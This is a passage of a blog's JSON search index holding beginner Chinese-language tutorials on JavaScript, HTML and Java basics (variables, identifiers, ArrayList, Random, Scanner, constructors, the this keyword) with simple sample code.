\"abcd\"; //使用用单引号输出双引号 var str1 = '\"1234\"'; //使用转义字符 var str2 = \"\\'qqqqqqq\\'\"; console.log(str); console.log(typeof str); console.log(str1) console.log(typeof str1); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS标识符","slug":"JS00006标识符","date":"2020-02-13T23:44:01.000Z","updated":"2020-02-14T04:38:59.770Z","comments":true,"path":"2020/02/14/JS00006标识符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00006标识符/","excerpt":"","text":"JS标识符 标识符 在JS中所有可以由我们自主命名的都可以称为是标识符. 例如:变量名,函数名,属性名等都属于标识符. 命名一个标识符时需要遵守如下规则: 1.标识符中可以含有字母,数字,下划线_,$ 2.标识符不能以数字开头. 3.标识符不能是ES中的关键字或保留字 4.标识符一般都采用小驼峰式法 -开头首字母小写,往后每个单词的首字母都是大写,其余的都是小写,例如helloWorld -JS底层保存标识符时实际上是采用Unicode的编码,也就是说标识符可以用中文,但不建议这样做.","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS字面常量和变量","slug":"JS00005字面常量和变量","date":"2020-02-13T23:32:00.000Z","updated":"2020-02-14T04:38:55.168Z","comments":true,"path":"2020/02/14/JS00005字面常量和变量/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00005字面常量和变量/","excerpt":"","text":"JS字面常量和变量 字面常量: 字面常量 都是一些不能改变的值,例如1,2,3,4; 字面常量都是可以直接使用的,但是我们一般不会直接使用; 变量: 变量可以用来保存字面量,而且变量的值是可以任意改变的. 变量在JS中使用var关键字来声明一个变量; 变量声明格式:var 变量名 = 初始值; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //声明一个变量 var a; //声明一个变量,并赋初始值 var age = 11; var height = 168.8; //对变量进行修改 age = 14; console.log(age); console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JS基本语法","slug":"JS00004基本语法","date":"2020-02-13T23:07:44.000Z","updated":"2020-02-14T04:38:50.703Z","comments":true,"path":"2020/02/14/JS00004基本语法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00004基本语法/","excerpt":"","text":"JS基本语法 JS注释 多行注释: 用 /* */ 单行注释: 用 // 注意 1.JS中严格区分大小写 2.JS中每一条语句以分号（ ；）结尾 如果不写分号,浏览器会自动添加,但是会消耗一些系统资源,而且有些时候,浏览器会加错分号,所以在开发中分号必须要写 3.JS中会忽略多个空格和换行，所以我们可以利用空格和换行对代码进行格式化。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;script&gt; //年龄 var age = 11; //身高 var height = 168.8; //在控制台上输出年龄 console.log(age); /* 在控制台上输出身高*/ console.log(height); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript的编写位置","slug":"JS00003JavaScript的编写位置","date":"2020-02-13T16:32:04.000Z","updated":"2020-02-14T04:38:46.177Z","comments":true,"path":"2020/02/14/JS00003JavaScript的编写位置/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/JS00003JavaScript的编写位置/","excerpt":"","text":"JavaScript的编写位置 可以将js代码写在button标签中的onclick属性中 &lt;button onclick=&quot;alert('我爱你');&quot; &gt;点我一下&lt;/button&gt; 可以将js代码写在超链接的href属性中,这样当点击超链接时,就会执行js代码. &lt;a href=&quot;javascript:alert('我太爱你了');&quot;&gt;1234&lt;/a&gt; &lt;a href=&quot;javascript:;&quot;&gt;1234&lt;/a&gt; 可以将js代码写到script标签 ( 推荐使用的方式 ) 123&lt;script type=\"text/javascript\"&gt;/*代码块*/&lt;/script&gt; 可以将js 代码编写到外部js文件中,然后通过script标签引入 外部文件后缀名以.js结尾 js代码写到外部文件中可以在不同的页面中同时引用,也可以利用浏览器的缓存机制. 注意: &lt;Script&gt;标签一旦用于引入外部文件了,就不能再编写代码在标签内部了,即使编写了浏览器也会忽略 如果需要插入其他js代码,则可以再创建一个新的script标签用于编写内部代码 123&lt;script type=\"text/javascript\" src=\"demo001.js\"&gt; &lt;/script&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"第一个JavaScript程序","slug":"JS00002第一个JavaScript程序","date":"2020-02-13T14:43:38.000Z","updated":"2020-02-14T04:38:37.197Z","comments":true,"path":"2020/02/13/JS00002第一个JavaScript程序/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00002第一个JavaScript程序/","excerpt":"","text":"第一个JavaScript程序 JavaScript程序以&lt;script&gt;开头,并以&lt;/script&gt;结尾 &lt;script type=&quot;text/javascript&quot;&gt;等价于&lt;script&gt; 弹出一个警告框:用alert(&quot;内容&quot;);函数 在文本写内容用:document.write(&quot;内容&quot;); 在控制台显示内容用: console.log(&quot;内容&quot;); 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; alert(\"我爱你\"); document.write(\"我爱你\"); console.log(\"get out!\"); &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"JavaScript基础","slug":"JS00001JavaScript基础","date":"2020-02-13T12:57:22.000Z","updated":"2020-02-14T04:41:12.482Z","comments":true,"path":"2020/02/13/JS00001JavaScript基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/JS00001JavaScript基础/","excerpt":"","text":"JavaScript基础 起源 JavaScript诞生于1995年,它的出现主要用于处理网页中的前端验证. 所谓的前端验证,就是指检查用户输入的内容是否符合一定的规则. 比如:用户名的长度,密码的长度,邮箱的格式等. 简史 JavaScript是由网景公司发明的,起初命名为LiveScrip,后来由SUN公司的介入更名为了JavaScript. 1996年微软公司在其最新的IE3浏览器中引入了自己对JavaScript的实现JScript. 于是在市面上存在两个版本的JavaScript,一个网景公司的JavaScript和微软的JScript. 为了确保不同的浏览器上运行的JavaScript标准一致,所以几个公司共同定制了JS的标准名命名为ECMAScript. 实现 ECMAScript是一个标准,而这个标准需要由各个厂商去实现. 不同的浏览器厂商对该标准会有不同的实现. 浏览器 JavaScript实现方式 Firefox SpiderMonkey Internet Explorer JScript/Chakra Safari JavaScriptCore Chrome v8 Carakan Carakan 学习JavaScript就是学习三个部分: ECMAScript DOM BOM","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"ArrayList集合的常用方法和遍历","slug":"java00048ArrayList集合的常用方法和遍历","date":"2020-02-13T08:08:58.000Z","updated":"2020-02-13T08:25:48.734Z","comments":true,"path":"2020/02/13/java00048ArrayList集合的常用方法和遍历/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00048ArrayList集合的常用方法和遍历/","excerpt":"","text":"ArrayList集合的常用方法和遍历 public boolean add(E)方法:向集合中添加一个元素 public E remove(int index)方法:在集合中移除一个元素 public E get(int index)方法:获取指定的集合元素 public int size()方法:获取集合的长度 索引从0开始 小技巧: 输入对象数组名.fori再按下tab键,会自动生成一个 1234for(int i = 0 ;i &lt; 对象名.size();i++)&#123;&#125; 123456789101112131415161718192021222324252627import java.util.ArrayList;public class Main14&#123; public static void main(String[] args) &#123; ArrayList&lt;Dog&gt; dog = new ArrayList&lt;&gt;(); //向dog集合添加元素 dog.add(new Dog(\"小黑\",1,\"黑色\")); dog.add(new Dog(\"小黄\",2,\"黄色\")); dog.add(new Dog(\"小白\",3,\"白色\")); dog.add(new Dog(\"小pi\",4,\"黑白色\")); printAll(dog); //移除dog集合中的第2号元素,索引从0开始; dog.remove(2); printAll(dog); &#125; public static void printAll(ArrayList&lt;Dog&gt; dog) &#123; //获取dog集合的长度 for (int i = 0; i &lt; dog.size(); i++) &#123; //获取dog集合中指定第i个元素,从索引0开始 dog.get(i).printAll(); System.out.println(\"============================================\"); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合概述和基本使用","slug":"java00047ArrayList集合概述和基本使用","date":"2020-02-13T07:54:03.000Z","updated":"2020-02-13T08:06:57.084Z","comments":true,"path":"2020/02/13/java00047ArrayList集合概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00047ArrayList集合概述和基本使用/","excerpt":"","text":"ArrayList集合概述和基本使用 ArrayList集合的长度是可以变化的 在java.util包中 ArrayList有一个尖括号&lt;E&gt;,代表泛型; 泛型也就是代表集合中每一个元素中的类型统一化 ,其中的E要替换为引用类型 注意: 泛型只能是引用类型,不能是基本类型. 在ArrayList类中直接打印对象名字显示的不是地址,而是内容 12345678910111213141516import java.util.ArrayList;public class Main13&#123; public static void main(String[] args) &#123; // ArrayList&lt;String&gt;代表strList集合中的元素全部都是String类型 //new ArrayList&lt;String&gt;() 等价于 new ArrayList&lt;&gt;() //从java1.7开始,右侧的尖括号中的内容可以不写,但是&lt;&gt;本身不能省略 ArrayList&lt;String&gt; strList = new ArrayList&lt;&gt;(); System.out.println(strList);//[] strList.add(\"张无忌\"); strList.add(\"张三丰\"); //直接打印对象名 System.out.println(strList);//[\"张无忌\",\"张三丰\"] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象数组","slug":"java00046对象数组","date":"2020-02-13T07:41:16.000Z","updated":"2020-02-13T07:52:54.312Z","comments":true,"path":"2020/02/13/java00046对象数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00046对象数组/","excerpt":"","text":"对象数组 对象数组的创建格式: 第一种方式: 类名[] 对象名 = new 类名[n];其中n代表数组的长度. 第二种方式: 类名[] 对象名 = {new 类名( [初始值] ) ,...,new 类名( [初始值] )} 注意事项: 创建了一个对象数组之后不能直接使用,因为还没有为数组分配对象. 第二种创建的对象数组可以直接使用,因为它一开始就给对象数组分配了对象 1234567891011121314151617181920212223public class Main12&#123; public static void main(String[] args) &#123; //创建对象数组,并对对象数组初始化 Dog[] dogArray = &#123;new Dog(),new Dog(),new Dog(),new Dog()&#125;; dogArray[0].setName(\"小黑\"); dogArray[0].setAge(1); dogArray[0].setColor(\"黑色\"); dogArray[1].setName(\"小白\"); dogArray[1].setAge(1); dogArray[1].setColor(\"白色\"); dogArray[2].setName(\"小黄\"); dogArray[2].setAge(1); dogArray[2].setColor(\"黄色\"); for (int i = 0; i &lt; dogArray.length; i++) &#123; dogArray[i].printAll(); System.out.println(\"=======================\"); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java生成一个1-n的随机数","slug":"java00045生成一个1-n的随机数","date":"2020-02-13T02:02:25.000Z","updated":"2020-02-13T02:11:23.967Z","comments":true,"path":"2020/02/13/java00045生成一个1-n的随机数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00045生成一个1-n的随机数/","excerpt":"","text":"生成一个1-n的随机数 思路: 1.定义一个int变量n,随意赋值. 2.要使用Random:三个步骤,导包,创建,使用 3.如果写10,那么就是0~9,然而想要的是1-10,可以发现:整体+1:rand.nextInt(n) + 1既可. 4.打印随机数字. 12345678910111213141516import java.util.Random;public class Main10&#123; public static void main(String[] args) &#123; int n = 5; //第一步 Random rand = new Random();//第二步 for (int i = 0; i &lt; 100; i++) &#123; int num = rand.nextInt(n) + 1; //第三步 System.out.println(num);//第四步 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Random概述和基本使用","slug":"java00044Random概述和基本使用","date":"2020-02-13T01:36:07.000Z","updated":"2020-02-13T01:54:36.195Z","comments":true,"path":"2020/02/13/java00044Random概述和基本使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00044Random概述和基本使用/","excerpt":"","text":"Random概述和基本使用 Random类是用来生成随机数字的.使用起来也是三个步骤: 1.导包 import java.util.Random 2.创建 Random rand = new Random();一般括号留空即可 3.使用 获取一个随机int数字(范围是int所有范围,有正负两种) int num = rand.nextInt(); 获取一个指定范围的随机int数字(获取范围: [ 0 ,int ) 闭合区间 ) 打印范围是0 ~ (int -1) int num = rand.nextInt(int); 1234567891011121314import java.util.Random;public class Main09&#123; public static void main(String[] args) &#123; Random rand = new Random(); //范围是负的int最大值~正的int最大值 System.out.println(\"随机数是: \" + rand.nextInt()); for(int i = 0; i &lt; 100; i++) &#123; System.out.println(rand.nextInt(100)); // 打印范围是0~99 &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象作为方法的参数及返回值","slug":"java00043匿名对象作为方法的参数及返回值","date":"2020-02-13T01:06:43.000Z","updated":"2020-02-13T01:21:31.332Z","comments":true,"path":"2020/02/13/java00043匿名对象作为方法的参数及返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00043匿名对象作为方法的参数及返回值/","excerpt":"","text":"匿名对象作为方法的参数及返回值 快速生成局部变量的快捷键: 想快速生成一个 Dog dog = new Dog();的局部变量只需要输入new Dog(); 并按下ALT + Entter 1234567891011121314151617181920212223import java.util.Scanner;public class Main08&#123; public static void main(String[] args) &#123; scanInt(new Scanner(System.in)); Dog dog = reDog(\"小黑\", 1, \"黑色\"); System.out.println(\"=====================================\"); dog.printAll(); &#125; //使用匿名对象作为参数 public static void scanInt(Scanner sc)&#123; System.out.println(\"请输入一个数: \"); int num = sc.nextInt(); System.out.println(\"你输入的数是: \" + num); &#125; //使用匿名对象作为返回值 public static Dog reDog(String name,int age,String color)&#123; return new Dog(name,age,color); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"匿名对象的说明","slug":"java00042匿名对象的说明","date":"2020-02-13T00:52:33.000Z","updated":"2020-02-13T01:05:22.186Z","comments":true,"path":"2020/02/13/java00042匿名对象的说明/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/13/java00042匿名对象的说明/","excerpt":"","text":"匿名对象的说明 没有名称的对象称为匿名对象,格式: new 类名(); 可以直接使用匿名对象来调用类方法,格式: new 类名().方法名(); 注意事项: 匿名对象只能使用一次,下次继续使用需要从新new一个,原来那个会自动回收掉. 1234567891011121314151617import java.util.Scanner;public class Main07&#123; public static void main(String[] args) &#123; System.out.print(\"请输入一个数:\"); int num = new Scanner(System.in).nextInt();//我是匿名对象 new Dog(\"小黄\",1,\"黄色\").printAll();//我是匿名对象 System.out.println(\"==================================\"); new Dog(\"小黑\",2,\"黑白\").printAll();//我是匿名对象 &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125; //打印所有成员变量&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"标签的属性","slug":"html-css00003标签的属性","date":"2020-02-12T14:25:03.000Z","updated":"2020-02-12T14:32:41.990Z","comments":true,"path":"2020/02/12/html-css00003标签的属性/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00003标签的属性/","excerpt":"","text":"标签的属性 属性: 可以通过属性来设置标签如何处理标签中的内容 在开始标签中添加属性 属性需要写在开始标签中,实际上就是一个名值对的结构 属性名 = &quot;属性值&quot;,一个标签中可以同时设置多个属性,属性之间需要使用空格隔开 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;h1&gt; &lt;!--通过font标签中的color属性来改变字体颜色--&gt; &lt;font color=\"red\"&gt;第一个&lt;/font&gt;网站 &lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML注释","slug":"html-css00002HTML注释","date":"2020-02-12T14:17:06.000Z","updated":"2020-02-12T14:20:28.931Z","comments":true,"path":"2020/02/12/html-css00002HTML注释/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00002HTML注释/","excerpt":"","text":"HTML注释 有时候需要对程序的说明,这时候就需要用到注释. 注释语法: &lt;!-- 内容 --&gt; 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;!-- 我是注释--&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"HTML/CSS基础","slug":"html-css00001HTML-CSS基础","date":"2020-02-12T13:45:47.000Z","updated":"2020-02-12T14:15:33.801Z","comments":true,"path":"2020/02/12/html-css00001HTML-CSS基础/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/html-css00001HTML-CSS基础/","excerpt":"","text":"HTML/CSS基础 软件架构 C/S,客户端/服务器端 1.一般我们使用的软件都是C/S架构 2.比如系统中的软件QQ,360,office等等 3.C表示客户端,用户通过客户端来使用软件 4.S表示服务器,服务器负责处理软件的业务逻辑 特点: 1.软件使用前必须得安装 2.软件更新时,服务器和客户端得同时更新 3.C/S架构的软件不能跨平台使用 4.C/S架构的软件客户端和服务器通信采用的是自有协议,相对来说比较安全 B/S,浏览器/服务器 1.B/S本质上也是C/S,只不过B/S架构的软件,使用浏览器作为软件客户端 2.B/S架构软件通过使用浏览器访问网页的形式,来使用软件,比如:京东,淘宝,知乎等等 特点: 1.软件不需要安装,直接使用浏览器访问指定的网址即可 2.软件更新时,客户端不需要更新 3.软件可以跨平台,只要系统中有浏览器,就可以使用. 4.B/S架构的软件,客户端和服务器之间通信采用的是通用的HTTP协议,相对来说不安全,一般采取https协议 W3C标准: 一个网页主要由三部分组成:结构,表现,行为. 结构:对应的是html ,用于描述页面的结构 表现:对应的是CSS, 用于控制页面中元素的样式 行为:对应的是JavaScript , 用于响应用户操作 HTML简介 HTML(Hypertext Markup Language) 超文本标记语言 负责网页的三个要素中的结构 HTML使用标签的形式来标识网页中的不同组成部分 所谓超文本指的是超链接,使用超链接可以让我们从一个页面跳转到另一个页面. 扩展名: .html 标准格式: 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"Scanner的概述及使用","slug":"java00041Scanner的概述及使用","date":"2020-02-12T11:46:36.000Z","updated":"2020-02-13T00:32:13.072Z","comments":true,"path":"2020/02/12/java00041Scanner的概述及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00041Scanner的概述及使用/","excerpt":"","text":"Scanner类的功能,可以实现键盘输入数据,到程序当中. 包路径:import java.util.Scanner; 使用步骤: 1 . 导包 import 包路径.类名称; 如果需要使用的目标类,和当前类位于同一个包下,则可以省略导包语句不写. 在java.lang包下的内容不需要导包,其他的包都需要import语句; 在集成环境中输入Scanner按下回车会自动进行导包; 2.创建 类名称 对象名 = new 类名称(); 3.使用 对象名.成员方法名() 获取键盘输入的一个int数字,int num = sc.nextInt(); 获取键盘输入的一串字符串: String str = sc.next(); 123456789101112131415161718192021222324252627//导包import java.util.Scanner;public class Main04&#123; public static void main(String[] args) &#123; Dog dog = new Dog(); //创建一个Scanner类 Scanner sc = new Scanner(System.in); System.out.println(\"请输入名字: \"); //输入一个字符串 dog.setName(sc.next()); System.out.println(\"请输入年龄: \"); //输入一个整数 dog.setAge(sc.nextInt()); System.out.println(\"请输入毛色: \"); //输入一个字符串 dog.setColor(sc.next()); System.out.println(\"==============================\"); dog.printAll(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Dog&#123; private String name;//姓名 private int age;//年龄 private String color;//毛色 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; public void printAll() &#123; System.out.println(\"名字: \" + name); System.out.println(\"年龄 \" + age); System.out.println(\"毛色: \" + color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"定义一个标准的类和自动生成构造函数与setter方法/getter方法","slug":"java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法","date":"2020-02-12T00:33:34.000Z","updated":"2020-02-12T00:52:06.153Z","comments":true,"path":"2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00040定义一个标准的类和自动生成构造函数与setter方法-getter方法/","excerpt":"","text":"定义一个标准的类和自动生成构造函数与setter方法/getter方法 一个标准的类 通常有四个部分组成: 所有的成员变量都要使用private关键字修饰 为每一个成员变量编写一对Getter/Setter方法 编写一个无参数的构造方法 编写一个全参数的构造方法 这样标准的类也叫做Java Bean 自动生成构造函数与setter方法/getter方法 通常定义一个标准的类只需要写私有成员变量就行了,其余部分交由编译器去生成. 生成所有私有变量的setter方法/getter 快捷键 : alt + insert 生成所有setter方法/getter方法 生成空构造函数 生成全参造函数 12345678910111213141516171819public class Main03&#123; public static void main(String[] args) &#123; //使用默认构造函数 Dog dog1 = new Dog(); dog1.setName(\"bobo\"); dog1.setAge(2); dog1.setColor(\"white\"); System.out.println(\"姓名: \" + dog1.getName() + \" 年龄: \" + dog1.getAge() + \" 毛色: \" + dog1.getColor()); System.out.println(\"====================\"); //使用全参构造函数 Dog dog2 = new Dog(\"copi\",1,\"blackAndYellow\"); //使用getter方法 System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); //使用setter方法 dog2.setAge(2); System.out.println(\"姓名: \" + dog2.getName() + \" 年龄: \" + dog2.getAge() + \" 毛色: \" + dog2.getColor()); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142public class Dog&#123; private String name;//姓名 private int age;//年龄 public Dog(String name, int age, String color) &#123; this.name = name; this.age = age; this.color = color; &#125; public Dog() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public String getColor() &#123; return color; &#125; public void setColor(String color) &#123; this.color = color; &#125; private String color;//毛色&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"构造方法","slug":"java00039构造方法","date":"2020-02-12T00:16:02.000Z","updated":"2020-02-12T00:31:58.939Z","comments":true,"path":"2020/02/12/java00039构造方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00039构造方法/","excerpt":"","text":"构造方法 构造方法是专门用来创建对象的方法,当我们通过关键字new来创建对象时,其实就是在调用构造方法. 构造方法的定义格式: public 类名称( [参数类型 参数名称 , ........] ){ 方法体 } 注意事项: 构造方法的名称必须和所在的类名称完全一样,就连大小写也要一样 构造方法不要写返回值类型,连void都不用写 构造方法不能return一个具体的返回值 如果没有编写如何构造方法,那么编译器将会默认定义一个空构造方法: public 类名 (){}; 一旦编写了至少一个构造方法,那么编译器将不再提供默认的构造方法. 构造方法也是可以重载的. 重载:方法名相同,参数列表不同; 12345678910111213141516public class Main02&#123; public static void main(String[] args) &#123; //默认构造函数 Student student1 = new Student(); //全参构造函数 Student student2 = new Student(\"赵敏\",20); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); //修改年龄 student2.setAge(21); System.out.println(\"姓名: \" + student2.getName() + \"年龄: \" + student2.getAge()); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334public class Student&#123; //私有成员变量 private String name; private int age; //无参构造方法 Student()&#123; System.out.println(\"无参构造方法被调用\"); &#125;; //全参构造方法 Student(String name,int age)&#123; this.name = name; this.age = age; &#125; //设置name public void setName(String name)&#123; this.name = name; &#125; //获取name public String getName()&#123; return this.name; &#125; //设置age public void setAge(int age) &#123; this.age = age; &#125; //获取age public int getAge()&#123; return this.age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字","slug":"java00038this关键字","date":"2020-02-12T00:09:38.000Z","updated":"2020-02-12T00:14:15.293Z","comments":true,"path":"2020/02/12/java00038this关键字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00038this关键字/","excerpt":"","text":"this关键字 当方法的局部变量和类的成员变量重名时,工具&quot;就近原则&quot;,优先使用局部变量. 如果需要访问本类的当中的成员变量,需要使用格式: this.变量名 通过谁调用的方法,谁就是this. 12345678public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"王思聪\"; person.printWho(\"王健林\"); &#125;&#125; 123456789public class Person&#123; public String name; public void printWho(String name) &#123; //局部变量name和成员变量name重名,所以用this区分 System.out.println(\"你好,我是\" + name + \"\\n你好,我是\" + this.name); // \\n是换行符 